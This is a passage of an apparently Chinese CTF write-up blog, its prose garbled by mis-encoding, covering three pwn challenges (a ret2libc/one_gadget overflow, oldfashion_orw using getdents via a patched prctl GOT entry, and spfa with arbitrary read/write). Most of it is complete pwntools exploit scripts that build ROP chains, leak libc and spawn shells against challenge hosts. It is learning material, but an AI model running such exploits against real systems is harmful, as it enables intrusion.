ˆç»“æ„è¢«æˆ‘ä»¬æå¾—ä¸ƒé›¶å…«è½çš„ï¼Œäºæ˜¯å°±è€ƒè™‘æ‰“ one_gadgetã€‚ï¼ˆä¸çŸ¥ä¸ºä½• ubuntu16.04 æ£€æµ‹ libc-2.31.so æ—¶ä¼šæŠ¥é”™ï¼Œ18 çš„å°±ä¸ä¼šï¼‰å¦‚ä¸‹ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/132953/12/29754/44405/63c8b9f0F978fb6b5/e01668aae890faba.png" style="zoom:80%;" /><p>ç›´æ¥æ‰“æ‰“ä¸é€šï¼Œé€‰æ‹©å°è¯•æ„é€ æ¡ä»¶ï¼Œå› ä¸ºç¨‹åºé‡Œæœ‰ csu çš„ gadgetï¼Œæ‰€ä»¥å°†å¯„å­˜å™¨ r15 å’Œ r12 ç½®é›¶è½»è€Œæ˜“ä¸¾ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/69351/29/25073/45548/63c8b9eeFc7a7133f/c5c0d76ceec68220.png" style="zoom:80%;" /><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./a.out&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">35225</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401363</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404030</span>)+p64(<span class="number">0x4010A0</span>)+p64(<span class="number">0x4011DA</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">3000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">setbuf_addr=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=setbuf_addr-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe6c7e</span></span><br><span class="line">log.success(<span class="string">&#x27;system==&gt;&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">log.success(<span class="string">&#x27;binsh===&gt;&#x27;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x000000000040135c</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(one_gadget)</span><br><span class="line"><span class="comment">#payload=payload.ljust(3000,&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="oldfashion-orw"><a href="#oldfashion-orw" class="headerlink" title="oldfashion_orw"></a>oldfashion_orw</h3><p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤ï¼ŒNX å¼€ç€ï¼Œçœ‹æ¥ä¸æ˜¯ç¼–å†™ shellcode é¢˜å‹</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/143518/13/33139/24804/63c7ac29F05bbc606/cbde94e9b4214053.png" style="zoom:80%;" /><p>çœ‹ä¸€ä¸‹ä¸»å‡½æ•°é€»è¾‘</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/161218/20/34466/65115/63c7ac22F5927c23f/96c8d82807f603c2.png" style="zoom:80%;" /><p>æœ‰ä¸ªæ²¡æ£€æŸ¥ä¸‹é™å¯¼è‡´çš„æ ˆæº¢å‡ºã€‚é€šè¿‡è¿™æ®µæº¢å‡ºï¼Œæ„é€  orw é“¾å³å¯ã€‚</p><p>ä½†è¿™é¢˜çš„ flag å¹¶ä¸å« flagï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å‡ºé¢˜äººç»™çš„éƒ¨ç½²æ–‡ä»¶ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/95051/26/18295/43571/63c7ac21F5f93642c/fb3c8ecc59e11856.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/209215/25/29511/55822/63c7ac20Fe576e25c/e415b3e6429764d6.png" style="zoom:80%;" /><p>æ‰€ä»¥è¿˜åº”å…ˆæ³„éœ² flag åç§°æ‰è¡Œï¼Œä¸€å¼€å§‹æƒ³çš„æ˜¯ chroot é€ƒé€¸æˆ–è€… opendir &amp; readdir ä¹‹ç±»çš„æ‰‹æ³•ï¼Ÿï¼Ÿï¼Ÿè™½ç„¶æˆ‘ä¹Ÿä¸ä¼šå°±æ˜¯äº†ã€‚æäº†ä¸€å¤©æ²¡æå‡ºæ¥å°±å»é—®äº†å‡ºé¢˜äººï¼Œå¸ˆå‚…å‘Šè¯‰æˆ‘å°±æ˜¯è¯»ç›®å½•ï¼Œ<strong>ç›®å½•ä¹Ÿæ˜¯æ–‡ä»¶</strong>ï¼Œå¿½ç„¶æƒ³åˆ° â€œ linux ä¸‹ä¸€åˆ‡çš†æ–‡ä»¶â€ çš„ç†è®ºã€‚</p><p>äºæ˜¯ç›´æ¥æƒ³ç€ç›´æ¥ open(â€œ/â€œ) è¿™æ ·å­çœ‹èƒ½ä¸èƒ½ç›´æ¥æŠŠç›®å½•ç›¸å…³æ•°æ®ç”¨ read å’Œ write è¯»å‡ºæ¥ï¼Œä½†å¤±è´¥äº†ï¼Œä¼¼ä¹ read è¯»ä¸äº†ç›®å½•æ–‡ä»¶ï¼Ÿäºæ˜¯å°±åœ¨ 64 ä½ç³»ç»Ÿè°ƒç”¨è¡¨ä¸Šæ‰¾å…¶ä»–ç³»ç»Ÿè°ƒç”¨ï¼Œæœ€åèŠ±äº†åŠå¤©æ‰¾åˆ°äº† â€˜getdentsâ€™</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/170693/32/34205/36390/63c7ac20F4f658c9f/6968cf0db5dc8df7.png" style="zoom:80%;" /><p>æ³¨ï¼šè¯¥é¢˜çš„ gadget é‡Œæ²¡æœ‰ syscallï¼Œéœ€è¦æˆ‘ä»¬æ”¹ [ prctl ] ä¸º [ prctl + offset ] syscall è¿™æ ·å­ï¼Œæœ€å 4bit ä¸º 0XCã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/6785/4/26433/55787/63c7acfbF533f2b1c/bebae0932440af72.png" style="zoom:80%;" /><p>è¯¥é¢˜ä¹Ÿæœ‰ csuï¼Œå› æ­¤å¯ä»¥æ„é€ ä»»æ„ç³»ç»Ÿè°ƒç”¨ï¼Œexp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">42614</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;libc-2.31.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">main=<span class="number">0x401315</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r15, r12, r13, r14</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r13d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r15</span></span><br><span class="line">    payload = p64(<span class="number">0x40143A</span>) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(<span class="number">0x401420</span>)</span><br><span class="line">    payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x401315</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401443</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401441</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#prctl====&gt;syscall</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)+p64(elf.got[<span class="string">&quot;prctl&quot;</span>])+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4010A0</span>)+p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;done!\n&#x27;</span>,p8(<span class="number">0xc</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(0,bss,0x10) bss===&gt;&#x27;/&#x27;</span></span><br><span class="line">bss=<span class="number">0x404088</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">0</span>,bss,<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;done!\n&#x27;</span>,<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(&quot;/&quot;)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4010A0</span>)+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;prctl&quot;</span>],bss,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.send(<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fstat</span></span><br><span class="line"><span class="comment">#temp=0x404088</span></span><br><span class="line"><span class="comment">#io.sendafter(&#x27;size?\n&#x27;,str(-1))</span></span><br><span class="line"><span class="comment">#payload=&#x27;a&#x27;*0x38+p64(pop_rdi_ret)+p64(0)</span></span><br><span class="line"><span class="comment">#payload+=p64(pop_rsi_r15_ret)+p64(bss-0x10)+p64(0)</span></span><br><span class="line"><span class="comment">#payload+=p64(0x4010A0)+csu(0,1,elf.got[&quot;prctl&quot;],3,temp,0)</span></span><br><span class="line"><span class="comment">#payload+=csu(0,1,elf.got[&quot;write&quot;],1,temp,0x300)</span></span><br><span class="line"><span class="comment">#payload+=p64(main)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#io.sendafter(&quot;content?\n&quot;,payload)</span></span><br><span class="line"><span class="comment">#io.send(&#x27;aaaaa&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getdents(0,bss,0x300)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">0</span>,bss+<span class="number">0x10</span>,<span class="number">78</span>)</span><br><span class="line">payload+=csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;prctl&quot;</span>],<span class="number">3</span>,bss,<span class="number">0x300</span>)</span><br><span class="line">payload+=csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;write&quot;</span>],<span class="number">1</span>,bss,<span class="number">0x300</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">78</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get flag_name</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">bk=io.recv(<span class="number">20</span>)</span><br><span class="line">log.success(<span class="string">&#x27;flag&#x27;</span>+bk)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(0,bss,0x20) ---- bss=&gt;flag_name</span></span><br><span class="line">bss=<span class="number">0x404088</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">0</span>,bss,<span class="number">0x20</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;done!\n&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>+bk+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(flag_name)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4010A0</span>)+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;prctl&quot;</span>],bss,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.send(<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(3,bss,0x80);write(1,bss,0x80)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">4</span>,bss,<span class="number">0x80</span>)</span><br><span class="line">payload+=csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;write&quot;</span>],<span class="number">1</span>,bss,<span class="number">0x80</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="spfa"><a href="#spfa" class="headerlink" title="spfa"></a>spfa</h3><p>wp å‡ºæ¥äº†ï¼Œä»»æ„è¯»æ¼æ´å½“æ—¶æ˜¯çœ‹åˆ°äº†çš„ï¼Œå°±æ˜¯ä¸çŸ¥é“æ€ä¹ˆç”¨ç®—æ³•è¾¾åˆ°ä»»æ„å†™çš„ç›®çš„ã€‚è¿˜æœ‰ä¸€äº›ç»†èŠ‚éœ€è¦æ³¨æ„ï¼Œä¸‹é¢ç»†è¯´ã€‚</p><h4 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h4><ul><li><p>ä»»æ„è¯»</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/58250/28/23044/25765/63c7ad58F93fb1283/7bb957defcb03fdb.png" style="zoom:80%;" /></li><li><p>å­˜åœ¨äº<code>add</code>å’Œ<code>spfa</code>å†…çš„ä»»æ„å†™</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/187146/37/31980/24100/63c7ad55F9bb13d32/bf2a17e2c9189750.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/75161/20/23579/45988/63c7ae06F5dcb0231/ae9e86f5eb192205.png" style="zoom:80%;" /></li><li><p>åé—¨å‡½æ•°</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/146622/35/33316/3113/63c7ae06Fa04326d0/02f29734fe8eaceb.png" style="zoom:80%;" /></li></ul><h4 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><ul><li>åˆ©ç”¨ä»»æ„è¯»æ³„éœ² got è¡¨ä¸Šçš„åœ°å€ï¼Œè·å¾— libc_base</li><li>åˆ©ç”¨ä»»æ„è¯»æ³„éœ² _fini_array ä¸Šçš„åœ°å€ï¼Œè·å¾— proc_base</li><li>åˆ©ç”¨ä»»æ„è¯»æ³„éœ² environ å†…çš„ç¯å¢ƒå˜é‡æ ˆåœ°å€ï¼ŒåŠ¨è°ƒè®¡ç®—åç§»å¾—åˆ° main æ ˆçš„è¿”å›åœ°å€</li><li>åˆ©ç”¨ä»»æ„å†™å°†è¿”å›åœ°å€è¦†ç›–ä¸ºåé—¨å‡½æ•°</li></ul><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line">io=process(<span class="string">&quot;./spfa&quot;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;chuj.top&quot;,47250)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;spfa&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"><span class="comment">#brute()</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;datas?\n&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get libc_base</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(-((elf.sym[<span class="string">&quot;dist&quot;</span>]-elf.got[<span class="string">&quot;setbuf&quot;</span>])//<span class="number">8</span>)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; the length of the shortest path is &quot;</span>)</span><br><span class="line">setbuf=<span class="built_in">int</span>(io.recv(<span class="number">15</span>),<span class="number">10</span>)</span><br><span class="line">libc_base=setbuf-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get proc_base</span></span><br><span class="line">_fini_array=<span class="number">0x6D28</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(-(elf.sym[<span class="string">&#x27;dist&#x27;</span>]-_fini_array)//<span class="number">8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; the length of the shortest path is &quot;</span>)</span><br><span class="line">proc_base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">10</span>)-<span class="number">0x12e0</span></span><br><span class="line">log.success(<span class="string">&quot;proc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get env_stack</span></span><br><span class="line">envir=libc_base+libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">dist=proc_base+elf.sym[<span class="string">&quot;dist&quot;</span>]</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>((envir-dist)//<span class="number">8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; the length of the shortest path is &quot;</span>)</span><br><span class="line">env_stack=<span class="built_in">int</span>(io.recv(<span class="number">15</span>),<span class="number">10</span>)</span><br><span class="line">log.success(<span class="string">&quot;env_stack===&gt;&quot;</span>+<span class="built_in">hex</span>(env_stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#write ret_addr</span></span><br><span class="line">ret_id=(env_stack-<span class="number">0x100</span>-dist)//<span class="number">8</span></span><br><span class="line">backdoor=proc_base+<span class="number">0x16AA</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">&quot;0 &quot;</span>+<span class="built_in">str</span>(ret_id)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(backdoor))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><hr><p>é¢˜ç›®è´¨é‡éƒ½å¥½é«˜ï¼Œä½†è¿™å‡ å¤©æ‰“è¿™ä¸ªæ¯”èµ›éƒ½æ²¡å¤ä¹ é«˜æ•°äº†ï¼Œä¹‹åçš„ week é¢˜å°±ä¸æ‰“äº†ï¼Œä½†è¦å¤ç›˜ã€‚</p><h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="blind"><a href="#blind" class="headerlink" 